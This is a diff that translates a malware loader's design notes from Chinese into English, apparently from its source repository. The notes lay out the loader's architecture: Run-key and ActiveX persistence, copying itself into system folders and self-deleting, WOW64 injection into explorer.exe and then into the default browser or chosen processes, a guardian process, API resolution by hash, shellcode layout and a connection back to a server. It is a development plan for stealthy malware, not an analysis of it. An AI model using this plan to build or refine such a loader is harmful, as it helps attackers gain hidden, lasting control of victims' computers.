@@ -1,48 +1,48 @@
 Loader functionality
 	Connection method:
-		Direct Connection (default, loader won't function without it)
+		Direct Connection
 		SOCKS5 connection (optional)
 
-	Persistence (optional)
-		HKLM/HKCU Run key (optional)
+	Persistence:
+		HKLM/HKCU Run key
 		ActiveX (optional/requires admin priv)
 
-	Self-copy (optional)
+	Self-copy:
 		System dir
 		Windows dir
 		Self-delete / Melt
 
-	Injection (optional, requires WOW64 related code) (需要包含32位与64位代码)(不使用注入的时候只需要包含32位代码，loader_main直接执行)
-		守护(可选功能)
-		注入到特定进程(查找四次进程，每次7秒的间隔，PI会注入到Explorer然后再注入到目标进程或者启动默认浏览器注入)
-		默认注入到默认浏览器(可选功能)
+	Injection (optional, requires WOW64 related code) (need to include 32-bit and 64-bit code) (when injection is disabled, only 32bit code is needed, loader_main executes directly)
+		Guardian (optional)
+		Inject into a specific process (enumerates thru 4 chosen processes with an interval of 7 seconds. PE will be injected into explorer.exe by default and then injected into the selected target process, or if that fails starts browser and injects into it)
+		Inject into the default browser
 		
-	WOW64功能
+	WOW64 functions:
 		wow64_call
-		wow64_inject_memroy
+		wow64_inject_memory
 		wow64_create_remote_thread
 	
-Loader -> 注入到Explorer(x86, x64) -> 注入到浏览器或者特定进程(x86)
+Loader -> Inject into explorer.exe (x86, x64) -> Inject into browser or specific process (x86)
 
-注入相关内存布局(
+Layout of mem-injection(
 	inject_to_explorer	
-		wow64_inject_memroy
+		wow64_inject_memory
 		wow64_create_remote_thread
-		wow64_call(vs编写)
+		wow64_call (vs)
 		
-		inject_to_explorer_code_x86(复制loader，添加启动项，删除原文件，注入到默认浏览器或特定进程)(vs编写)
-		inject_to_explorer_code_x64(复制loader，添加启动项，删除原文件，注入到默认浏览器或特定进程)(vs编写)
+		inject_to_explorer_code_x86(Copy loader, add startup items, delete original files, and inject into default browser or specific processes) (vs)
+		inject_to_explorer_code_x64(Copy loader, add startup items, delete original files, and inject into default browser or specific processes) (vs)
 		
 		get_proc_from_hash_x64
 		get_kernel32_base_x64
 		get_ntdll_base_x64
 		
-为了更方便的协调x86与x64 code
-所有的额外函数都被扩充成了int64
+For more convenient coordination between x86 and x64 code
+All extra functions have been expanded to int64
 
-代码结构
-	entry(修复api,修复基本函数,拷贝config到结构中，如果不注入的话，就直接拷贝文件，增加启动项，创建thread)
-	inject_to_explorer(注入到explorer中的代码，拷贝文件，增加启动项，注入socket_main到目标进程，创建IE进程并注入，守护)
+Code Structure:
+	entry(API fixups, fix basic functions, extract config，unless injection enabled then just copy to temp，add to startup，and create thread)
+	inject_to_explorer(code injected into explorer, copy files, add startup items, inject socket_main to target process, create IE process and inject, process guard)
 		wow64_call
 		wow64_inject_memroy
 		wow64_create_remote_thread
@@ -50,15 +50,14 @@ Loader -> 注入到Explorer(x86, x64) -> 注入到浏览器或者特定进程(x86)
 		get_ntdll_base_x64
 		get_proc_from_hash_x64
 		
-	thread_main(注入到目标进程的代码，连接服务端等)
+	thread_main(Code injected into the target process, connecting to the server, etc. )
 
-文件夹
-	include(通用声明x86 and x64)
-	extra_function(额外的函数)
-	loader_main(主shellcode)
-	
-x64 api如何修复
-	声明结构体
-	vc编写x64 code
-	编写fix代码
-	
+folder
+	include (general declaration x86 and x64)
+	extra_function (extra function)
+	loader_main (main shellcode)
+
+How to fix x64 api
+	Declaration structure
+	vc write x64 code
+	Write fix code
